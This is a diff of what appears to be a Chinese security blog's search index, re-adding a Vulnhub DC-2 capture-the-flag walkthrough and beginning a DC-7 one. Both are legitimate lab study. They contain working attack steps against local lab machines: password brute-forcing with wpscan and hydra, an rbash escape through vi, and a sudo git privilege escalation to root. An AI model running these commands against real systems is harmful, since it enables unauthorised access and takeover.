@@ -158,6 +158,163 @@
       </tags>
   </entry>
   <entry>
+    <title>Vulnhub-DC-2渗透学习</title>
+    <url>/2022/06/09/Vulnhub-DC-2/</url>
+    <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
+<p>攻击机：Kali-2021.3：192.168.8.105</p>
+<p>靶机：Vulnhub-DC-2：192.168.8.222</p>
+<p>靶机下载地址：<a href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a></p>
+</blockquote>
+<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>首先使用nmap进行主机探活</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.8.0/24</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/1.png" alt></p>
+<p>然后逐个扫描，判断出靶机的IP地址</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.8.222</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/2.png" alt></p>
+<p>发现我们的目标开放了80和7744端口，80端口是默认端口，7744端口是开放了ssh服务</p>
+<p>使用whatweb继续寻找相关信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whatweb 192.168.8.222</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/3.png" alt></p>
+<p>然后发现这个网站使用的CMS是WordPress 4.7.10</p>
+<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>首先访问一下80端口，发现flag就在下面</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/4.png" alt></p>
+<p>这里有点奇怪，网上的大部分教程在这一步都会出现域名无法解析的情况，因为在访问这个网址的时候，直接跳转到了<a href="http://dc-2/的域名上了，而我们的本地hosts文件里是没有该域名的解析ip，所以导致无法访问。但是我这里直接就访问成功了，有点奇怪">http://dc-2/的域名上了，而我们的本地hosts文件里是没有该域名的解析ip，所以导致无法访问。但是我这里直接就访问成功了，有点奇怪</a></p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/5.png" alt></p>
+<p>正常流程是需要在本机的hosts文件中加入指向该域名的ip地址</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows：</span><br><span class="line">C:/Windows/System32/drivers/etc/hosts</span><br><span class="line">Linux：</span><br><span class="line">/etc/hosts</span><br></pre></td></tr></table></figure>
+<p>打开hosts文件后加入下面的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.8.222 dc-2</span><br></pre></td></tr></table></figure>
+<p>再次访问就能够访问成功了，并找到第一个flag</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/6.png" alt></p>
+<p>翻译：</p>
+<blockquote>
+<p>您通常的单词表可能不起作用，因此，也许您只需要成为 cewl。</p>
+<p>更多的密码总是更好，但有时你无法赢得所有密码。</p>
+<p>以一个身份登录以查看下一个标志。</p>
+<p>如果找不到，请以另一个身份登录。</p>
+</blockquote>
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>flag1提示中提到<strong>cewl</strong>，检索一下发现这是一个生成密码字典的工具，很明显这是让我们用这个工具来生成密码来爆破，可是现在我们还没有用户名。</p>
+<p><a href="https://www.freebuf.com/articles/network/190128.html">Kali Linux字典生成工具Cewl使用全指南</a></p>
+<p>信息收集里我们已经知道了这个网站的CMS是WordPress，而Kali中自带有一个专门用来扫描该CMS的工具：wpscan</p>
+<p><a href="https://zhuanlan.zhihu.com/p/149725645">Kali(渗透工具):WPScan的使用（WordPress扫描工具）</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2 --enumerate u //枚举出用户名</span><br><span class="line">注：这里的url必须使用域名，否则无法扫描</span><br></pre></td></tr></table></figure>
+<p>发现一共存在三个用户</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/7.png" alt></p>
+<p>将这三个用户存入txt文件中：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo -e &quot;admin \njerry \ntom&quot; &gt; users.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/8.png" alt></p>
+<p>然后通过cewl来生成我们的密码字典</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cewl http://dc-2/ -w passwd.txt</span><br><span class="line">注：这里必须使用域名，否则会出错</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/9.png" alt></p>
+<p>那么接下来就是爆破了，但爆破前得找到这个网站的登录入口，有两种方法</p>
+<ol>
+<li><p>通过浏览器检索关键信息来寻找</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/10.png" alt></p>
+</li>
+<li><p>通过扫描网站后台文件来寻找</p>
+<p>这里理论上可以使用御剑来扫后台，前提是你的字典足够大</p>
+<p>而我这里则推荐使用Kali中的一款web页面扫描工具：<strong>nikto</strong></p>
+<p><a href="https://blog.csdn.net/smli_ng/article/details/105994754">Nikto详细使用教程</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nikto -host 192.168.8.222</span><br><span class="line">nikto -url 192.168.8.222</span><br></pre></td></tr></table></figure>
+<p>扫描完后可以找到该网站的登录页面的地址</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/11.png" alt></p>
+</li>
+</ol>
+<p>两种方法都可以进入登录页面：</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/12.png" alt></p>
+<p>使用wpscan开始爆破</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -U users.txt -P passwd.txt</span><br></pre></td></tr></table></figure>
+<p>成功爆破出了两个账户密码</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/13.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Username: jerry, Password: adipiscing</span><br><span class="line">Username: tom, Password: parturient</span><br></pre></td></tr></table></figure>
+<p>尝试登录，进去后就能找到flag2，除此以外就没什么有用的信息了，两个账号的信息是一样的，没必要登录两次</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/14.png" alt></p>
+<p>翻译：</p>
+<blockquote>
+<p>如果您不能利用 WordPress 并走捷径，还有另一种方法。</p>
+<p>希望你找到另一个切入点。</p>
+</blockquote>
+<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>提示说我们需要换一个切入点，还记得之前的7744端口吗，这很有可能就是另一个切入点，所以尝试使用刚刚的账号密码登录SSH服务，因为ssh的默认端口是22，因此我们需要在后面加上指定端口，这里在尝试后会发现只有tom账号可以成功登录</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh jerry@192.168.8.222 -p 7744</span><br><span class="line">ssh tom@192.168.8.222 -p 7744</span><br></pre></td></tr></table></figure>
+<p>这里如果前提是不知道账号密码的话，可以使用<strong>hydra</strong>进行ssh破解</p>
+<p><a href="https://zhuanlan.zhihu.com/p/397779150">黑客工具之hydra详细使用教程</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra 192.168.8.222 -L users.txt -P passwd.txt -s 7744 ssh</span><br></pre></td></tr></table></figure>
+<p>这个工具的破解所花的时间比较久，得耐心等会</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/15.png" alt></p>
+<p>然后连接tom账号的ssh服务，成功登录！</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/16.png" alt></p>
+<p>寻找到flag3，但是发现是rbash，就是被限制了的shell</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/17.png" alt></p>
+<p>大致限制情况如下：</p>
+<ol>
+<li>不能通过 cd 来改变工作目录</li>
+<li>不能设置或取消环境变量： SHELL， PATH， ENV， BASH_ENV</li>
+<li>命令名中不能包含目录分隔符 ‘/‘</li>
+<li>不能使用包含有 ‘/‘ 的文件名作为内置命令 ‘.’ 的参数（即文件名中不能有 ‘/‘）</li>
+<li>不能使用 <code>&gt;， &gt;|， &lt;&gt;， &gt;&amp;， &amp;&gt;， &gt;&gt;</code> 等重定向操作符</li>
+<li>不能使用 exec 内置命令</li>
+<li>…</li>
+</ol>
+<p><a href="http://kuanghy.github.io/2017/02/20/rbash">受限的 bash — rbash </a></p>
+<p>但是我们依然可以使用<code>vi</code>或<code>less</code>命令，所以可以查看到flag3的值</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi flag3.txt</span><br><span class="line">less flag3.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/18.png" alt></p>
+<blockquote>
+<p>Poor old Tom is always running after Jerry. Perhaps he should <strong>su</strong> for all the stress he causes.</p>
+</blockquote>
+<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>提示中提到了su，这不难理解，既然rbash使我们的权限受到了限制，那我们就得想办法绕过它，然后通过<code>su jerry</code>切换用户</p>
+<p><a href="https://blog.csdn.net/weixin_43705814/article/details/111879362">rbash绕过</a></p>
+<p>通过vi编辑器进行绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi //终端上运行vi编辑器</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/19.png" alt></p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/20.png" alt></p>
+<p>然后出来就能看到不是rbash了</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/21.png" alt></p>
+<p>然后再设置一下环境变量</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin/</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/22.png" alt></p>
+<p>第一条命令的作用是添加根目录的bin文件夹到$PATH</p>
+<p>第二条命令的作用和上一条一样，添加usr/bin文件夹到$PATH</p>
+<p>里面的冒号只是起分隔作用，并没有其他作用</p>
+<p>这样我们就可以使用这些文件夹中的命令了，接下来就是切换用户了</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/23.png" alt></p>
+<p>切换成功后发现还是在tom的工作目录上，所以更换工作目录，然后就能很快找到flag4</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/24.png" alt></p>
+<blockquote>
+<p>Good to see that you’ve made it this far - but you’re not home yet. </p>
+<p>You still need to get the final flag (the only flag that really counts!!!).  </p>
+<p>No hints here - you’re on your own now.  :-)</p>
+<p>Go on - <strong>git</strong> outta here!!!!</p>
+</blockquote>
+<h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p>猜测最后一个flag大概率位于root中，所以我们得提权，先来看看SUID提权</p>
+<p>查看具有SUID权限的命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>发现并没有像DC-1的find命令那样可以用来提权</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/25.png" alt></p>
+<p>于是去查看一下具有root权限的命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p>发现存在一个免密的git命令（具有root权限）</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/26.png" alt></p>
+<p>同时flag4中也提示了git，因此用到了git提权</p>
+<p><a href="https://blog.csdn.net/qq_38612882/article/details/122772867">2022-渗透测试-git提权（Linux）</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo git help config </span><br><span class="line">!/bin/bash 或 !&#x27;sh&#x27; //在末尾添加</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/27.png" alt></p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/28.png" alt></p>
+<p>成功得到了root权限，进入root就能得到flag</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/29.png" alt></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_45742511/article/details/114666974">靶机测试—DC（2）</a></p>
+<p><a href="https://blog.csdn.net/qq_61237064/article/details/123500520?spm=1001.2014.3001.5502">dc-2 靶机渗透学习</a></p>
+]]></content>
+      <categories>
+        <category>靶场&amp;靶机</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>靶机</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Vulnhub-DC-3渗透学习</title>
     <url>/2022/06/11/Vulnhub-DC-3/</url>
     <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
@@ -310,163 +467,6 @@
 <h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_61237064/article/details/123546254?spm=1001.2014.3001.5502">dc-3 靶机渗透学习_ZredamanJ的博客-CSDN博客_dc3靶机</a></p>
 <p><a href="https://blog.csdn.net/weixin_45996361/article/details/123054544">Vulnhub靶机：DC-3渗透详细过程_1erkeU的博客-CSDN博客</a></p>
 <p><a href="https://cloud.tencent.com/developer/article/1818091">反弹Shell,看这一篇就够了-腾讯云开发者社区-腾讯云</a></p>
-]]></content>
-      <categories>
-        <category>靶场&amp;靶机</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>靶机</tag>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Vulnhub-DC-2渗透学习</title>
-    <url>/2022/06/09/Vulnhub-DC-2/</url>
-    <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
-<p>攻击机：Kali-2021.3：192.168.8.105</p>
-<p>靶机：Vulnhub-DC-2：192.168.8.222</p>
-<p>靶机下载地址：<a href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a></p>
-</blockquote>
-<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>首先使用nmap进行主机探活</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.8.0/24</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/09/Vulnhub-DC-2/1.png" alt></p>
-<p>然后逐个扫描，判断出靶机的IP地址</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.8.222</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/09/Vulnhub-DC-2/2.png" alt></p>
-<p>发现我们的目标开放了80和7744端口，80端口是默认端口，7744端口是开放了ssh服务</p>
-<p>使用whatweb继续寻找相关信息</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whatweb 192.168.8.222</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/09/Vulnhub-DC-2/3.png" alt></p>
-<p>然后发现这个网站使用的CMS是WordPress 4.7.10</p>
-<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>首先访问一下80端口，发现flag就在下面</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/4.png" alt></p>
-<p>这里有点奇怪，网上的大部分教程在这一步都会出现域名无法解析的情况，因为在访问这个网址的时候，直接跳转到了<a href="http://dc-2/的域名上了，而我们的本地hosts文件里是没有该域名的解析ip，所以导致无法访问。但是我这里直接就访问成功了，有点奇怪">http://dc-2/的域名上了，而我们的本地hosts文件里是没有该域名的解析ip，所以导致无法访问。但是我这里直接就访问成功了，有点奇怪</a></p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/5.png" alt></p>
-<p>正常流程是需要在本机的hosts文件中加入指向该域名的ip地址</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows：</span><br><span class="line">C:/Windows/System32/drivers/etc/hosts</span><br><span class="line">Linux：</span><br><span class="line">/etc/hosts</span><br></pre></td></tr></table></figure>
-<p>打开hosts文件后加入下面的内容</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.8.222 dc-2</span><br></pre></td></tr></table></figure>
-<p>再次访问就能够访问成功了，并找到第一个flag</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/6.png" alt></p>
-<p>翻译：</p>
-<blockquote>
-<p>您通常的单词表可能不起作用，因此，也许您只需要成为 cewl。</p>
-<p>更多的密码总是更好，但有时你无法赢得所有密码。</p>
-<p>以一个身份登录以查看下一个标志。</p>
-<p>如果找不到，请以另一个身份登录。</p>
-</blockquote>
-<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>flag1提示中提到<strong>cewl</strong>，检索一下发现这是一个生成密码字典的工具，很明显这是让我们用这个工具来生成密码来爆破，可是现在我们还没有用户名。</p>
-<p><a href="https://www.freebuf.com/articles/network/190128.html">Kali Linux字典生成工具Cewl使用全指南</a></p>
-<p>信息收集里我们已经知道了这个网站的CMS是WordPress，而Kali中自带有一个专门用来扫描该CMS的工具：wpscan</p>
-<p><a href="https://zhuanlan.zhihu.com/p/149725645">Kali(渗透工具):WPScan的使用（WordPress扫描工具）</a></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2 --enumerate u //枚举出用户名</span><br><span class="line">注：这里的url必须使用域名，否则无法扫描</span><br></pre></td></tr></table></figure>
-<p>发现一共存在三个用户</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/7.png" alt></p>
-<p>将这三个用户存入txt文件中：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo -e &quot;admin \njerry \ntom&quot; &gt; users.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/09/Vulnhub-DC-2/8.png" alt></p>
-<p>然后通过cewl来生成我们的密码字典</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cewl http://dc-2/ -w passwd.txt</span><br><span class="line">注：这里必须使用域名，否则会出错</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/09/Vulnhub-DC-2/9.png" alt></p>
-<p>那么接下来就是爆破了，但爆破前得找到这个网站的登录入口，有两种方法</p>
-<ol>
-<li><p>通过浏览器检索关键信息来寻找</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/10.png" alt></p>
-</li>
-<li><p>通过扫描网站后台文件来寻找</p>
-<p>这里理论上可以使用御剑来扫后台，前提是你的字典足够大</p>
-<p>而我这里则推荐使用Kali中的一款web页面扫描工具：<strong>nikto</strong></p>
-<p><a href="https://blog.csdn.net/smli_ng/article/details/105994754">Nikto详细使用教程</a></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nikto -host 192.168.8.222</span><br><span class="line">nikto -url 192.168.8.222</span><br></pre></td></tr></table></figure>
-<p>扫描完后可以找到该网站的登录页面的地址</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/11.png" alt></p>
-</li>
-</ol>
-<p>两种方法都可以进入登录页面：</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/12.png" alt></p>
-<p>使用wpscan开始爆破</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -U users.txt -P passwd.txt</span><br></pre></td></tr></table></figure>
-<p>成功爆破出了两个账户密码</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/13.png" alt></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Username: jerry, Password: adipiscing</span><br><span class="line">Username: tom, Password: parturient</span><br></pre></td></tr></table></figure>
-<p>尝试登录，进去后就能找到flag2，除此以外就没什么有用的信息了，两个账号的信息是一样的，没必要登录两次</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/14.png" alt></p>
-<p>翻译：</p>
-<blockquote>
-<p>如果您不能利用 WordPress 并走捷径，还有另一种方法。</p>
-<p>希望你找到另一个切入点。</p>
-</blockquote>
-<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>提示说我们需要换一个切入点，还记得之前的7744端口吗，这很有可能就是另一个切入点，所以尝试使用刚刚的账号密码登录SSH服务，因为ssh的默认端口是22，因此我们需要在后面加上指定端口，这里在尝试后会发现只有tom账号可以成功登录</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh jerry@192.168.8.222 -p 7744</span><br><span class="line">ssh tom@192.168.8.222 -p 7744</span><br></pre></td></tr></table></figure>
-<p>这里如果前提是不知道账号密码的话，可以使用<strong>hydra</strong>进行ssh破解</p>
-<p><a href="https://zhuanlan.zhihu.com/p/397779150">黑客工具之hydra详细使用教程</a></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra 192.168.8.222 -L users.txt -P passwd.txt -s 7744 ssh</span><br></pre></td></tr></table></figure>
-<p>这个工具的破解所花的时间比较久，得耐心等会</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/15.png" alt></p>
-<p>然后连接tom账号的ssh服务，成功登录！</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/16.png" alt></p>
-<p>寻找到flag3，但是发现是rbash，就是被限制了的shell</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/17.png" alt></p>
-<p>大致限制情况如下：</p>
-<ol>
-<li>不能通过 cd 来改变工作目录</li>
-<li>不能设置或取消环境变量： SHELL， PATH， ENV， BASH_ENV</li>
-<li>命令名中不能包含目录分隔符 ‘/‘</li>
-<li>不能使用包含有 ‘/‘ 的文件名作为内置命令 ‘.’ 的参数（即文件名中不能有 ‘/‘）</li>
-<li>不能使用 <code>&gt;， &gt;|， &lt;&gt;， &gt;&amp;， &amp;&gt;， &gt;&gt;</code> 等重定向操作符</li>
-<li>不能使用 exec 内置命令</li>
-<li>…</li>
-</ol>
-<p><a href="http://kuanghy.github.io/2017/02/20/rbash">受限的 bash — rbash </a></p>
-<p>但是我们依然可以使用<code>vi</code>或<code>less</code>命令，所以可以查看到flag3的值</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi flag3.txt</span><br><span class="line">less flag3.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/09/Vulnhub-DC-2/18.png" alt></p>
-<blockquote>
-<p>Poor old Tom is always running after Jerry. Perhaps he should <strong>su</strong> for all the stress he causes.</p>
-</blockquote>
-<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>提示中提到了su，这不难理解，既然rbash使我们的权限受到了限制，那我们就得想办法绕过它，然后通过<code>su jerry</code>切换用户</p>
-<p><a href="https://blog.csdn.net/weixin_43705814/article/details/111879362">rbash绕过</a></p>
-<p>通过vi编辑器进行绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi //终端上运行vi编辑器</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/09/Vulnhub-DC-2/19.png" alt></p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/20.png" alt></p>
-<p>然后出来就能看到不是rbash了</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/21.png" alt></p>
-<p>然后再设置一下环境变量</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin/</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/09/Vulnhub-DC-2/22.png" alt></p>
-<p>第一条命令的作用是添加根目录的bin文件夹到$PATH</p>
-<p>第二条命令的作用和上一条一样，添加usr/bin文件夹到$PATH</p>
-<p>里面的冒号只是起分隔作用，并没有其他作用</p>
-<p>这样我们就可以使用这些文件夹中的命令了，接下来就是切换用户了</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/23.png" alt></p>
-<p>切换成功后发现还是在tom的工作目录上，所以更换工作目录，然后就能很快找到flag4</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/24.png" alt></p>
-<blockquote>
-<p>Good to see that you’ve made it this far - but you’re not home yet. </p>
-<p>You still need to get the final flag (the only flag that really counts!!!).  </p>
-<p>No hints here - you’re on your own now.  :-)</p>
-<p>Go on - <strong>git</strong> outta here!!!!</p>
-</blockquote>
-<h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p>猜测最后一个flag大概率位于root中，所以我们得提权，先来看看SUID提权</p>
-<p>查看具有SUID权限的命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p>发现并没有像DC-1的find命令那样可以用来提权</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/25.png" alt></p>
-<p>于是去查看一下具有root权限的命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p>发现存在一个免密的git命令（具有root权限）</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/26.png" alt></p>
-<p>同时flag4中也提示了git，因此用到了git提权</p>
-<p><a href="https://blog.csdn.net/qq_38612882/article/details/122772867">2022-渗透测试-git提权（Linux）</a></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo git help config </span><br><span class="line">!/bin/bash 或 !&#x27;sh&#x27; //在末尾添加</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/09/Vulnhub-DC-2/27.png" alt></p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/28.png" alt></p>
-<p>成功得到了root权限，进入root就能得到flag</p>
-<p><img src="/2022/06/09/Vulnhub-DC-2/29.png" alt></p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_45742511/article/details/114666974">靶机测试—DC（2）</a></p>
-<p><a href="https://blog.csdn.net/qq_61237064/article/details/123500520?spm=1001.2014.3001.5502">dc-2 靶机渗透学习</a></p>
 ]]></content>
       <categories>
         <category>靶场&amp;靶机</category>
@@ -736,6 +736,128 @@
       </tags>
   </entry>
   <entry>
+    <title>Vulnhub-DC-7渗透学习</title>
+    <url>/2022/08/14/Vulnhub-DC-7/</url>
+    <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
+<p>攻击机：Kali-2021.3：192.168.11.132</p>
+<p>靶机：Vulnhub-DC-7：192.168.11.141</p>
+</blockquote>
+<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>主机探活</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.11.1-255</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/1.png" alt></p>
+<p>扫描目标端口</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.11.141</span><br></pre></td></tr></table></figure>
+<p>同时也知道了这个网站的CMS是<code>Drupal 8</code></p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/2.png" alt></p>
+<p>既然知道了CMS，那就去看看有没有什么漏洞可以利用</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit drupal 8</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/3.png" alt></p>
+<p>我尝试了几个，但都没有什么结果</p>
+<p>接着我又用<code>msf</code>尝试一下</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/4.png" alt></p>
+<p>但也是一样的结果，没有什么利用的上的</p>
+<p>那就说明这个靶机不是按照正常套路来的，那就直接访问一下看看，访问之后发现有作者给出的线索</p>
+<blockquote>
+<p>DC-7 引入了一些“新”概念，但我会让你弄清楚它们是什么。 :-)</p>
+<p>虽然这个挑战并不完全是技术性的，但如果您需要诉诸暴力破解或字典攻击，您可能不会成功。</p>
+<p>你要做的，就是跳出框框思考。</p>
+<p>方式“外”框。 :-)</p>
+</blockquote>
+<p>作者告诉我们思维不要被限制，那就来看看这个网站的特点吧</p>
+<p>在这个页面的footer也就是页脚处发现一个看起来并不正常的东西</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/5.png" alt></p>
+<p>直接复制去必应搜索一下，搜索后发现有个Github账号</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/6.png" alt></p>
+<p>进入后发现他有个项目：<code>staffdb</code></p>
+<p>进入这个项目中，在<code>config.php</code>中发现了一个账户和密码</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/7.png" alt></p>
+<blockquote>
+<p>dc7user / MdR3xOgB7#dW</p>
+</blockquote>
+<p>尝试登录网站后台，但是无论尝试几次，依然是错误的</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/8.png" alt></p>
+<p>难道这个是靶场的账号密码吗，想起刚刚开放了22端口，尝试ssh登录</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh dc7user@192.168.11.141</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/9.png" alt></p>
